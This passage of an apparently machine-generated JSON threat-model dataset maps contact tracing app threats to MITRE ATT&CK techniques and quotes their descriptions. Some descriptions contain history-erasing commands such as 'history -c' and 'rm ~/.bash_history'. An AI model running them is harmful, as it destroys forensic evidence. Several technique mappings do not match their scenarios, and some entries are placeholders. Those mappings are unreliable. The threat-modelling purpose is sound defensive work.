                "description": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)\n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",
                "id": "attack-pattern--bf96a5a3-3bce-43b7-8597-88545984c07b",
                "technique_id": "T1574.009"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Logs on user devices store sensitive information accessible to attackers.",
            "Assumptions": [
                {
                    "Assumption": "Sensitive information is logged without masking.",
                    "Role": "Application",
                    "Condition": "Logs include plain sensitive data."
                },
                {
                    "Assumption": "Log files are stored without encryption.",
                    "Role": "Application",
                    "Condition": "Logs are stored in plaintext."
                },
                {
                    "Assumption": "Users do not have secure local storage.",
                    "Role": "Device",
                    "Condition": "Device storage is not protected."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data via log files.",
            "MITRE ATT&CK Keywords": [
                "logging",
                "information disclosure",
                "sensitive data",
                "local storage"
            ],
            "mitre_technique": {
                "name": "Data from Local System",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
                "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
                "technique_id": "T1005"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack on the central server disrupts the contact tracing process.",
            "Assumptions": [
                {
                    "Assumption": "Server infrastructure can be overwhelmed by high traffic.",
                    "Role": "System",
                    "Condition": "Server cannot handle high volumes of requests."
                },
                {
                    "Assumption": "No traffic filtering to identify DDoS patterns.",
                    "Role": "System",
                    "Condition": "System lacks DDoS mitigation features."
                },
                {
                    "Assumption": "Attackers have control over a botnet.",
                    "Role": "Attacker",
                    "Condition": "Attackers can organize and execute a large-scale attack."
                }
            ],
            "Potential Impact": "Service disruption affecting overall data collection and notifications.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "high traffic",
                "server"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware on user devices causes app crashes preventing proper data collection.",
            "Assumptions": [
                {
                    "Assumption": "Users can install harmful apps.",
                    "Role": "User",
                    "Condition": "Operating systems allow unvetted app installations."
                },
                {
                    "Assumption": "No runtime checks to identify malware.",
                    "Role": "Application",
                    "Condition": "Application cannot detect or defend against runtime anomalies."
                },
                {
                    "Assumption": "Malware can interfere with app operations.",
                    "Role": "Attacker",
                    "Condition": "Malware with such capabilities is accessible."
                }
            ],
            "Potential Impact": "Reduced data integrity and loss of proximity data.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "malware",
                "application crash",
                "data collection"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attackers flood the system with fake exposure notifications.",
            "Assumptions": [
                {
                    "Assumption": "There is no rate-limiting on exposure notifications.",
                    "Role": "System",
                    "Condition": "System does not restrict notification volume."
                },
                {
                    "Assumption": "Attackers can automate notification generation.",
                    "Role": "Attacker",
                    "Condition": "Attackers possess automation tools."
                },
                {
                    "Assumption": "No validation mechanism for notification legitimacy.",
                    "Role": "System",
                    "Condition": "System does not validate the source of notifications."
                }
            ],
            "Potential Impact": "User desensitization and decreased trust in the system.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "notification flood",
                "automation",
                "validation"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malware gains root access to user devices and manipulates the contact tracing data.",
            "Assumptions": [
                {
                    "Assumption": "OS vulnerabilities allow privilege escalation.",
                    "Role": "Device",
                    "Condition": "Operating system has security flaws."
                },
                {
                    "Assumption": "Users install applications with elevated permissions.",
                    "Role": "User",
                    "Condition": "Applications request more permissions than needed."
                },
                {
                    "Assumption": "No prior security checks before granting permissions.",
                    "Role": "Device",
                    "Condition": "OS does not enforce strict permission handling."
                }
            ],
            "Potential Impact": "Compromise of data integrity and potential unauthorized actions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "root access",
                "data manipulation",
                "malware"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attackers exploit vulnerabilities in the app to gain unauthorized admin access.",
            "Assumptions": [
                {
                    "Assumption": "App has unpatched security vulnerabilities.",
                    "Role": "Application",
                    "Condition": "Application is not regularly updated."
                },
                {
                    "Assumption": "No security hardening applied to sensitive modules.",
                    "Role": "Application",
                    "Condition": "Application modules lack comprehensive security measures."
                },
                {
                    "Assumption": "Attackers possess tools to exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Exploitation tools are available."
                }
            ],
            "Potential Impact": "Unauthorized actions and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "application vulnerabilities",
                "admin access",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Insider threat exploits privileged access to tamper with user data.",
            "Assumptions": [
                {
                    "Assumption": "Privileged accounts are not monitored.",
                    "Role": "System",
                    "Condition": "System does not track privileged user activities."
                },
                {
                    "Assumption": "Access controls are inadequate.",
                    "Role": "System",
                    "Condition": "Insufficient access control policies are in place."
                },
                {
                    "Assumption": "Insider is motivated to misuse access privileges.",
                    "Role": "Insider",
                    "Condition": "There is an individual with malicious intent."
                }
            ],
            "Potential Impact": "Integrity and confidentiality breaches with potential data leaks.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "tampering",
                "access control"
            ],
            "mitre_technique": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
                "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
                "technique_id": "T1222.002"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "26",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user by exploiting a lack of strong authentication mechanisms.",
            "Assumptions": [
                {
                    "Assumption": "The application utilizes weak or no authentication for user login.",
                    "Role": "Attacker",
                    "Condition": "Application design lacks robust verification processes."
                },
                {
                    "Assumption": "An attacker has access to user details such as email or phone number.",
                    "Role": "Attacker",
                    "Condition": "Personal information obtained via social engineering or phishing."
                },
                {
                    "Assumption": "Users are not using multi-factor authentication.",
                    "Role": "User",
                    "Condition": "Application does not enforce multi-factor authentication."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive contact tracing data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "account manipulation"
            ],
            "mitre_technique": {
                "name": "Account Manipulation",
                "description": "Adversaries may manipulate accounts to maintain and/or elevate access to victim systems. Account manipulation may consist of any action that preserves or modifies adversary access to a compromised account, such as modifying credentials or permission groups.(Citation: FireEye SMOKEDHAM June 2021) These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078).",
                "id": "attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27",
                "technique_id": "T1098"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious entity creates a fake contact tracing app and persuades users to install it.",
            "Assumptions": [
                {
                    "Assumption": "Users download applications from unofficial sources.",
                    "Role": "User",
                    "Condition": "Application is distributed outside official app stores."
                },
                {
                    "Assumption": "Attackers can create apps that mimic the legitimate contact tracing app.",
                    "Role": "Attacker",
                    "Condition": "Accessibility to application distribution platforms."
                },
                {
                    "Assumption": "Lack of user awareness about malicious apps.",
                    "Role": "User",
                    "Condition": "Users are not informed of the risks of downloading apps from unknown sources."
                }
            ],
            "Potential Impact": "Unauthorized access to personal and sensitive data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "application layer",
                "malicious app",
                "phishing"
            ],
            "mitre_technique": {
                "name": "Identify Business Tempo",
                "description": "Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization\u2019s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim\u2019s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))",
                "id": "attack-pattern--2339cf19-8f1e-48f7-8a91-0262ba547b6f",
                "technique_id": "T1591.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Intruder mimics Bluetooth signals to spoof proximity detections.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth communication is not encrypted.",
                    "Role": "Attacker",
                    "Condition": "Design flaw in Bluetooth communication protocol."
                },
                {
                    "Assumption": "Attackers have technical capability to generate spoofed Bluetooth IDs.",
                    "Role": "Attacker",
                    "Condition": "Proficiency with Bluetooth technology and tools."
                },
                {
                    "Assumption": "Devices are set to discoverable mode by default.",
                    "Role": "User",
                    "Condition": "Standard configuration of mobile devices."
                }
            ],
            "Potential Impact": "Tampered proximity data leads to false exposure notifications, causing unnecessary panic.",
            "MITRE ATT&CK Keywords": [
                "bluetooth",
                "proximity",
                "spoofing",
                "wireless communications"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Bluetooth",
                "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
                "technique_id": "T1011.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the rolling keys uploaded to the server in the decentralized architecture.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient validation of uploaded keys on the server.",
                    "Role": "Server",
                    "Condition": "Flawed server-side validation logic."
                },
                {
                    "Assumption": "An attacker has the ability to intercept and alter data in transit.",
                    "Role": "Attacker",
                    "Condition": "Exploit of network vulnerabilities."
                },
                {
                    "Assumption": "Rolling keys are not cryptographically secured.",
                    "Role": "Application",
                    "Condition": "Lack of encryption mechanisms for keys."
                }
            ],
            "Potential Impact": "Corruption of exposure data, leading to inaccurate tracking results.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data corruption",
                "key manipulation",
                "data transmission"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A malicious user alters log file data to hide their activities.",
            "Assumptions": [
                {
                    "Assumption": "Log files are accessible without proper safeguards.",
                    "Role": "Attacker",
                    "Condition": "Improper access control on log files."
                },
                {
                    "Assumption": "Insufficient integrity checks on stored log data.",
                    "Role": "Server",
                    "Condition": "Lack of validation for log file integrity."
                },
                {
                    "Assumption": "Logs are not stored in a secure and tamper-evident manner.",
                    "Role": "Application",
                    "Condition": "Weak logging infrastructure."
                }
            ],
            "Potential Impact": "Compromised forensic evidence and traceability of malicious actions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "logging",
                "file integrity",
                "data hiding"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An unauthorized user modifies the central server data to cause false exposure notifications.",
            "Assumptions": [
                {
                    "Assumption": "No robust authentication mechanisms for server administrators.",
                    "Role": "Server",
                    "Condition": "Weak or no administrator verification processes."
                },
                {
                    "Assumption": "Insufficient access controls on server data.",
                    "Role": "Server",
                    "Condition": "Improperly configured server access settings."
                },
                {
                    "Assumption": "The attacker has user-level access to the server.",
                    "Role": "Attacker",
                    "Condition": "Exploitation of weaker user accounts to escalate privileges."
                }
            ],
            "Potential Impact": "Spurious alerting, causing widespread panic and distrust.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "server compromise",
                "data manipulation",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having tested positive and disputes the exposure notifications they triggered.",
            "Assumptions": [
                {
                    "Assumption": "Logs and actions are not non-reputable.",
                    "Role": "Application",
                    "Condition": "Insufficient record-keeping of user actions."
                },
                {
                    "Assumption": "No proof of positive test status is stored securely.",
                    "Role": "Server",
                    "Condition": "Weak or no data verification for test results."
                },
                {
                    "Assumption": "User activities are not adequately tracked.",
                    "Role": "Application",
                    "Condition": "Lack of transparency in activity logging mechanisms."
                }
            ],
            "Potential Impact": "Challenges in enforcing trustworthiness and accountability of the system's notifications.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "user denial",
                "activity logging",
                "traceability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates server logs to erase traces of their unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "Server logs are not protected against tampering.",
                    "Role": "Server",
                    "Condition": "Insufficient logging security measures in place."
                },
                {
                    "Assumption": "Logs are not monitored or backed up regularly.",
                    "Role": "Server Admin",
                    "Condition": "Lack of regular log verification and audit processes."
                },
                {
                    "Assumption": "Attacker has established unauthorized access to the server.",
                    "Role": "Attacker",
                    "Condition": "Successful exploit of server access controls."
                }
            ],
            "Potential Impact": "Obfuscation of attack vectors, making forensic investigation difficult.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "action hiding",
                "forensics"
            ],
            "mitre_technique": {
                "name": "Clear Command History",
                "description": "In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.\n\nAdversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).(Citation: US-CERT-TA18-106A)\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)",
                "id": "attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a",
                "technique_id": "T1070.003"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A legitimate user disputes app-generated data claiming it is inaccurate.",
            "Assumptions": [
                {
                    "Assumption": "Inaccuracies can occur due to faulty data collection methods.",
                    "Role": "Application",
                    "Condition": "Inherent technological limitations of Bluetooth or GPS."
                },
                {
                    "Assumption": "The system lacks a mechanism for users to verify logged data.",
                    "Role": "Application",
                    "Condition": "No transparent user verification feature."
                },
                {
                    "Assumption": "Data validation protocols are not comprehensive.",
                    "Role": "Server",
                    "Condition": "Weak validation pipeline for collected data."
                }
            ],
            "Potential Impact": "System reliability questioned, leading to decreased user adoption and trust.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data accuracy",
                "user trust",
                "dispute"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted Bluetooth communications between devices.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth communications are not encrypted.",
                    "Role": "Application",
                    "Condition": "Design flaw in communication protocol."
                },
                {
                    "Assumption": "Attacker is within proximity of communicating devices.",
                    "Role": "Attacker",
                    "Condition": "Physical proximity to target devices."
                },
                {
                    "Assumption": "Users are unaware of potential Bluetooth vulnerabilities.",
                    "Role": "User",
                    "Condition": "Lack of awareness of security best practices."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of users' contact tracing data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "bluetooth",
                "communication interception",
                "data sniffing"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Bluetooth",
                "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
                "technique_id": "T1011.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A compromised user device leaks collected contact tracing information to other malicious entities.",
            "Assumptions": [
                {
                    "Assumption": "Device is vulnerable to malware that exfiltrates data.",
                    "Role": "Device",
                    "Condition": "Presence of known or unknown vulnerabilities in user devices."
                },
                {
                    "Assumption": "Security controls on devices are insufficient.",
                    "Role": "User",
                    "Condition": "Use of outdated or insecure devices without adequate protection."
                },
                {
                    "Assumption": "Users download applications from untrusted sources.",
                    "Role": "User",
                    "Condition": "Lack of strict app installation policies."
                }
            ],
            "Potential Impact": "Leakage of personal and contact data without user consent.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data exfiltration",
                "malware",
                "device compromise"
            ],
            "mitre_technique": {
                "name": "Domain Generation Algorithms",
